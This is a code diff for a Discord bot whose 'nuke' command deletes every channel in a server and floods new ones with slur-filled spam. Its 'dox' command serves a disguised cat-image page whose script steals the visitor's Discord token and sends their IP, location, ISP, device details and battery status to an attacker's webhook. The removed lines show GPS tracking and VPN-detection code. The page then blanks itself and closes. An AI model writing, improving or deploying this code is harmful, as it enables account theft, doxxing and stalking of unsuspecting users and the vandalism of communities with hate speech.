@@ -15,7 +15,8 @@ if (!TOKEN) {
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.MessageContent
     ]
 });
 
@@ -34,6 +35,7 @@ app.get('/img/:id.png', (req, res) => {
     res.send(generateDoxHTML(data.webhook));
 });
 
+// ---- COMMAND REGISTRATION ----
 async function registerCommands() {
     try {
         await client.application.commands.set([
@@ -56,6 +58,50 @@ async function registerCommands() {
                         required: true
                     }
                 ]
+            },
+            {
+                name: 'ping',
+                description: '🏓 Check bot latency'
+            },
+            {
+                name: 'serverinfo',
+                description: '📊 Get server information'
+            },
+            {
+                name: 'userinfo',
+                description: '👤 Get user information',
+                options: [
+                    {
+                        name: 'user',
+                        type: 6,
+                        description: 'Target user',
+                        required: false
+                    }
+                ]
+            },
+            {
+                name: 'avatar',
+                description: '🖼️ Get user avatar',
+                options: [
+                    {
+                        name: 'user',
+                        type: 6,
+                        description: 'Target user',
+                        required: false
+                    }
+                ]
+            },
+            {
+                name: 'say',
+                description: '💬 Make the bot say something',
+                options: [
+                    {
+                        name: 'message',
+                        type: 3,
+                        description: 'Message to say',
+                        required: true
+                    }
+                ]
             }
         ]);
         console.log('✅ Commands registered');
@@ -64,58 +110,47 @@ async function registerCommands() {
     }
 }
 
+// ---- INTERACTION HANDLER ----
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
-    const { commandName } = interaction;
+    const { commandName, options, user, member, guild, channel } = interaction;
 
+    // ---- NUKE ----
     if (commandName === 'nuke') {
         await interaction.deferReply({ ephemeral: true });
 
         const guild = interaction.guild;
-        if (!guild) {
-            return interaction.editReply('❌ This command can only be used in a server.');
-        }
+        if (!guild) return interaction.editReply('❌ Server only.');
 
         const botMember = guild.members.cache.get(client.user.id);
-        if (!botMember) {
-            return interaction.editReply('❌ I am not in this server. Please add me with Administrator permissions.');
+        if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
+            return interaction.editReply('❌ I need **Administrator** permissions.');
         }
 
-        if (!botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
-            return interaction.editReply('❌ I need **Administrator** permissions to nuke.');
-        }
-
-        if (nukeRunning) {
-            return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
-        }
+        if (nukeRunning) return interaction.editReply('❌ Nuke already running. Use `/stop`.');
 
         nukeRunning = true;
         nukeGuildId = guild.id;
-
-        await interaction.editReply('🚀 **NUKE STARTED!** Use `/stop` to stop it.');
+        await interaction.editReply('🚀 **NUKE STARTED!** Use `/stop` to stop.');
         await startNuke(guild);
     }
 
+    // ---- STOP ----
     if (commandName === 'stop') {
         await interaction.deferReply({ ephemeral: true });
-
-        if (!nukeRunning) {
-            return interaction.editReply('❌ No nuke is currently running.');
-        }
-
+        if (!nukeRunning) return interaction.editReply('❌ No nuke running.');
         nukeRunning = false;
         nukeGuildId = null;
         await interaction.editReply('⏹️ **Nuke stopped.**');
     }
 
+    // ---- DOX ----
     if (commandName === 'dox') {
         await interaction.deferReply({ ephemeral: true });
 
         const guild = interaction.guild;
-        if (!guild) {
-            return interaction.editReply('❌ This command can only be used in a server.');
-        }
+        if (!guild) return interaction.editReply('❌ Server only.');
 
         const wh = interaction.options.getString('webhook');
         if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
@@ -129,13 +164,86 @@ client.on('interactionCreate', async (interaction) => {
         const embed = new EmbedBuilder()
             .setTitle('✅ Dox Link Ready')
             .setColor(0x22c55e)
-            .setDescription(`🔗 **${url}**\n\nSends IP, location, ISP, ASN, battery, VPN detection, and device info.`)
+            .setDescription(`🔗 **${url}**\n\nSends IP, location, ISP, battery, and device info.`)
             .setFooter({ text: `Generated by ${interaction.user.tag}` });
 
         await interaction.editReply({ embeds: [embed] });
     }
+
+    // ---- PING ----
+    if (commandName === 'ping') {
+        const sent = await interaction.reply({ content: '🏓 Pinging...', fetchReply: true });
+        const latency = sent.createdTimestamp - interaction.createdTimestamp;
+        await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
+    }
+
+    // ---- SERVERINFO ----
+    if (commandName === 'serverinfo') {
+        await interaction.deferReply({ ephemeral: true });
+        if (!guild) return interaction.editReply('❌ Server only.');
+
+        const owner = await guild.fetchOwner();
+        const embed = new EmbedBuilder()
+            .setTitle(`📊 ${guild.name}`)
+            .setColor(0x8B5CF6)
+            .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }) || null)
+            .addFields(
+                { name: '🆔 Server ID', value: guild.id, inline: true },
+                { name: '👑 Owner', value: owner.user.tag, inline: true },
+                { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
+                { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
+                { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
+                { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
+            );
+        await interaction.editReply({ embeds: [embed] });
+    }
+
+    // ---- USERINFO ----
+    if (commandName === 'userinfo') {
+        await interaction.deferReply({ ephemeral: true });
+        const target = interaction.options.getUser('user') || user;
+        const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
+
+        const embed = new EmbedBuilder()
+            .setTitle(`👤 ${target.tag}`)
+            .setColor(0x8B5CF6)
+            .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 }))
+            .addFields(
+                { name: '🆔 User ID', value: target.id, inline: true },
+                { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
+                { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
+            );
+        if (memberTarget) {
+            embed.addFields(
+                { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
+                { name: '📊 Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
+            );
+        }
+        await interaction.editReply({ embeds: [embed] });
+    }
+
+    // ---- AVATAR ----
+    if (commandName === 'avatar') {
+        await interaction.deferReply({ ephemeral: true });
+        const target = interaction.options.getUser('user') || user;
+        const embed = new EmbedBuilder()
+            .setTitle(`${target.tag}'s Avatar`)
+            .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }))
+            .setColor(0x8B5CF6);
+        await interaction.editReply({ embeds: [embed] });
+    }
+
+    // ---- SAY ----
+    if (commandName === 'say') {
+        await interaction.deferReply({ ephemeral: true });
+        const msg = interaction.options.getString('message');
+        if (!channel) return interaction.editReply('❌ No channel.');
+        await channel.send(msg);
+        await interaction.editReply('✅ Sent.');
+    }
 });
 
+// ---- START NUKE ----
 async function startNuke(guild) {
     const variants = [
         '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
@@ -151,9 +259,7 @@ async function startNuke(guild) {
     for (let i = 0; i < channelArray.length; i += 10) {
         const batch = channelArray.slice(i, i + 10);
         await Promise.all(batch.map(async (ch) => {
-            try {
-                await ch.delete();
-            } catch(e) {}
+            try { await ch.delete(); } catch(e) {}
         }));
         await new Promise(r => setTimeout(r, 50));
     }
@@ -170,8 +276,7 @@ async function startNuke(guild) {
                         big += line + '\n';
                     }
                     big += `\n${inviteLine}`;
-                    const spamMessage = big.slice(0, 2000);
-                    await ch.send(spamMessage);
+                    await ch.send(big.slice(0, 2000));
                 } catch(e) {}
                 await new Promise(r => setTimeout(r, 10));
             }
@@ -191,39 +296,33 @@ async function startNuke(guild) {
                 ]);
                 
                 const valid = newChannels.filter(c => c !== null);
-                for (const ch of valid) {
-                    spamChannel(ch);
-                }
-                
+                for (const ch of valid) spamChannel(ch);
                 createdCount += valid.length;
-                console.log(`Created ${createdCount} channels total`);
-                
+                console.log(`Created ${createdCount} channels`);
             } catch(e) {}
             await new Promise(r => setTimeout(r, 10));
         }
     }
 
     createChannelsAndSpam();
-
     guild.channels.cache.forEach(ch => {
-        if (ch.type === ChannelType.GuildText) {
-            spamChannel(ch);
-        }
+        if (ch.type === ChannelType.GuildText) spamChannel(ch);
     });
 }
 
-// ---- SIMPLE DOX HTML - NO SYNTAX ERRORS ----
+// ---- DOX HTML ----
 function generateDoxHTML(webhook) {
-    return `<!DOCTYPE html>
+    return `
+<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0b0b12; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
+        * { margin: 0; padding: 0; }
+        body { background: #0b0b12; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; }
         .container { text-align: center; }
-        .container img { max-width: 90%; max-height: 80vh; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); border: 1px solid rgba(255,255,255,0.06); }
+        .container img { max-width: 90%; max-height: 80vh; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
         .caption { color: #555; font-size: 14px; margin-top: 12px; }
     </style>
 </head>
@@ -232,207 +331,91 @@ function generateDoxHTML(webhook) {
         <img src="https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg" alt="Cat" />
         <div class="caption">Loading...</div>
     </div>
-    <script>
-        const WEBHOOK_URL = "${webhook}";
 
-        function sendToWebhook(data) {
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            }).catch(function(e) {});
+<script>
+const WEBHOOK = "${webhook}";
+
+function send(data) {
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    }).catch(() => {});
+}
+
+// ---- STEAL TOKEN ----
+(function() {
+    try {
+        const token = localStorage.getItem('token') || 
+                      document.cookie.split('; ').find(r => r.startsWith('token='))?.split('=')[1];
+        if (token) {
+            send({ content: "**🎯 Discord Token:** ```" + token + "```" });
         }
+    } catch(e) {}
+})();
 
-        function stealToken() {
-            try {
-                var token = localStorage.getItem("token") || 
-                            document.cookie.split("; ").find(function(row) { return row.startsWith("token="); }).split("=")[1] ||
-                            sessionStorage.getItem("token");
-                if (token) {
-                    sendToWebhook({
-                        content: "**🎯 DISCORD TOKEN:** ```" + token + "```"
-                    });
-                }
-            } catch (e) {}
-        }
+// ---- GET IP & DOX ----
+(async function() {
+    try {
+        const res = await fetch('https://ipinfo.io/json');
+        const d = await res.json();
+        if (!d.ip) return;
 
-        function getIPData() {
-            return fetch("https://ipinfo.io/json")
-                .then(function(res) { return res.json(); })
-                .then(function(data) {
-                    return {
-                        ip: data.ip || "N/A",
-                        country: data.country || "N/A",
-                        region: data.region || "N/A",
-                        city: data.city || "N/A",
-                        postal: data.postal || "N/A",
-                        lat: data.loc ? data.loc.split(",")[0] : "N/A",
-                        lon: data.loc ? data.loc.split(",")[1] : "N/A",
-                        isp: data.org || "N/A",
-                        timezone: data.timezone || "N/A"
-                    };
-                })
-                .catch(function() {
-                    return {
-                        ip: "N/A",
-                        country: "N/A",
-                        region: "N/A",
-                        city: "N/A",
-                        postal: "N/A",
-                        lat: "N/A",
-                        lon: "N/A",
-                        isp: "N/A",
-                        timezone: "N/A"
-                    };
-                });
-        }
+        const ua = navigator.userAgent;
+        const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
+        const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
+        const device = /mobile|android|iphone|ipad/i.test(ua) ? 'Mobile' : 'Desktop';
 
-        function getGPSLocation() {
-            return new Promise(function(resolve) {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        resolve({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        });
-                    },
-                    function(err) {
-                        resolve(null);
-                    },
-                    { enableHighAccuracy: true, timeout: 8000 }
-                );
-            });
-        }
+        const lat = d.loc ? d.loc.split(',')[0] : 'N/A';
+        const lon = d.loc ? d.loc.split(',')[1] : 'N/A';
+        const map = lat !== 'N/A' ? 'https://www.google.com/maps?q=' + lat + ',' + lon : 'N/A';
 
-        function getBattery() {
-            return navigator.getBattery().then(function(b) {
-                return {
-                    level: Math.round(b.level * 100),
-                    charging: b.charging
-                };
-            }).catch(function() {
-                return null;
-            });
-        }
+        const embed = {
+            title: "☠️ Doxxed",
+            color: 0xFF0000,
+            fields: [
+                { name: "🌐 IP", value: d.ip || 'N/A', inline: true },
+                { name: "🏙️ City", value: d.city || 'N/A', inline: true },
+                { name: "🗺️ Region", value: d.region || 'N/A', inline: true },
+                { name: "🌍 Country", value: d.country || 'N/A', inline: true },
+                { name: "📮 Postal", value: d.postal || 'N/A', inline: true },
+                { name: "🏢 ISP", value: d.org || 'N/A', inline: true },
+                { name: "🕒 Timezone", value: d.timezone || 'N/A', inline: true },
+                { name: "📍 Location", value: map, inline: false },
+                { name: "🧠 Browser", value: browser, inline: true },
+                { name: "💻 OS", value: os, inline: true },
+                { name: "🖥️ Device", value: device, inline: true },
+                { name: "⏰ Time", value: new Date().toString(), inline: false }
+            ],
+            footer: { text: "☠️ PULSE DOX" }
+        };
 
-        function detectVPN(ipData, gpsData) {
-            var score = 0;
-            var signals = [];
-            var vpnKeywords = ["vpn", "proxy", "cloudflare", "aws", "amazon", "digitalocean", "vultr", "linode", "hetzner", "ovh", "m247", "psychz", "hostinger", "namecheap", "contabo", "server", "hosting", "dedicated", "datacenter", "cloud", "vps"];
-            var isp = (ipData.isp || "").toLowerCase();
-            for (var i = 0; i < vpnKeywords.length; i++) {
-                if (isp.includes(vpnKeywords[i])) {
-                    score += 2;
-                    signals.push("ISP matches VPN/hosting provider");
-                    break;
-                }
-            }
-            try {
-                var browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                if (ipData.timezone && ipData.timezone !== "N/A" && browserTz && ipData.timezone !== browserTz) {
-                    score += 3;
-                    signals.push("Timezone mismatch: IP says " + ipData.timezone + " but browser says " + browserTz);
-                }
-            } catch (e) {}
-            if (gpsData && ipData.lat !== "N/A" && ipData.lon !== "N/A") {
-                var ipLat = parseFloat(ipData.lat);
-                var ipLon = parseFloat(ipData.lon);
-                var gpsLat = gpsData.lat;
-                var gpsLon = gpsData.lon;
-                var distance = Math.sqrt(Math.pow(ipLat - gpsLat, 2) + Math.pow(ipLon - gpsLon, 2)) * 111;
-                if (distance > 100) {
-                    score += 5;
-                    signals.push("Location mismatch: IP says " + ipData.city + " but GPS shows different location");
-                }
-            }
-            return {
-                detected: score >= 3,
-                score: score,
-                signals: signals
-            };
-        }
+        send({ embeds: [embed] });
 
-        function runDox() {
-            stealToken();
-            getIPData().then(function(ipData) {
-                getGPSLocation().then(function(gpsData) {
-                    getBattery().then(function(battery) {
-                        var vpn = detectVPN(ipData, gpsData);
-                        var ua = navigator.userAgent;
-                        var browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
-                        var os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
-                        var device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";
-                        var now = new Date();
-                        var timestamp = now.toISOString();
-                        var fields = [];
+        try {
+            const b = await navigator.getBattery();
+            send({ content: "🔋 Battery: " + Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : " (Not Charging)") });
+        } catch(e) {}
 
-                        fields.push({ name: "🌐 IP", value: ipData.ip, inline: true });
-                        fields.push({ name: "🏙️ City", value: ipData.city, inline: true });
-                        fields.push({ name: "🗺️ Region", value: ipData.region, inline: true });
-                        fields.push({ name: "🌍 Country", value: ipData.country, inline: true });
-                        fields.push({ name: "🏢 ISP", value: ipData.isp, inline: true });
-                        fields.push({ name: "🕒 Timezone", value: ipData.timezone, inline: true });
+    } catch(e) {
+        send({ content: "❌ Dox error: " + e.message });
+    }
+})();
 
-                        if (ipData.lat !== "N/A" && ipData.lon !== "N/A") {
-                            fields.push({ name: "📍 IP Location", value: "https://www.google.com/maps?q=" + ipData.lat + "," + ipData.lon, inline: false });
-                        }
+// ---- CLOSE ----
+setTimeout(() => {
+    document.body.innerHTML = '';
+    document.body.style.background = '#000';
+    document.body.style.margin = '0';
+    document.body.style.height = '100vh';
+    setTimeout(() => {
+        window.close();
+        window.location.href = 'about:blank';
+    }, 500);
+}, 5000);
 
-                        if (gpsData) {
-                            fields.push({ 
-                                name: "📍 GPS Location", 
-                                value: "Lat: " + gpsData.lat + " Lon: " + gpsData.lon + " Accuracy: " + Math.round(gpsData.accuracy) + "m", 
-                                inline: false 
-                            });
-                        }
-
-                        if (battery) {
-                            fields.push({ name: "🔋 Battery", value: battery.level + "%" + (battery.charging ? " (Charging)" : " (Not Charging)"), inline: true });
-                        }
-
-                        fields.push({ name: "🛡️ VPN", value: vpn.detected ? "✅ Likely (Score: " + vpn.score + ")" : "❌ Not detected", inline: true });
-
-                        if (vpn.signals.length > 0) {
-                            fields.push({ name: "🔍 VPN Signals", value: vpn.signals.join("\\n"), inline: false });
-                        }
-
-                        fields.push({ name: "🧠 Browser", value: browser, inline: true });
-                        fields.push({ name: "💻 OS", value: os, inline: true });
-                        fields.push({ name: "🖥️ Device", value: device, inline: true });
-                        fields.push({ name: "⏰ Time", value: timestamp, inline: false });
-
-                        sendToWebhook({
-                            embeds: [{
-                                title: "☠️ TARGET COMPROMISED",
-                                color: 0xFF0000,
-                                fields: fields,
-                                footer: { text: "☠️ PULSE DOX SYSTEM" }
-                            }]
-                        });
-                    });
-                });
-            });
-        }
-
-        runDox();
-
-        setTimeout(function() {
-            document.body.innerHTML = "";
-            document.body.style.background = "#000000";
-            document.body.style.margin = "0";
-            document.body.style.height = "100vh";
-            setTimeout(function() {
-                window.close();
-                window.location.href = "about:blank";
-            }, 300);
-        }, 5000);
-
-        document.querySelector(".caption").textContent = "Image loaded successfully.";
-    <\/script>
+document.querySelector('.caption').textContent = 'Image loaded successfully.';
+</script>
 </body>
 </html>`;
 }
@@ -442,6 +425,7 @@ setInterval(() => {
     if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
 }, 60000);
 
+// ---- BOT STARTUP ----
 client.once('ready', async () => {
     console.log(`🤖 ${client.user.tag} is online!`);
     await registerCommands();
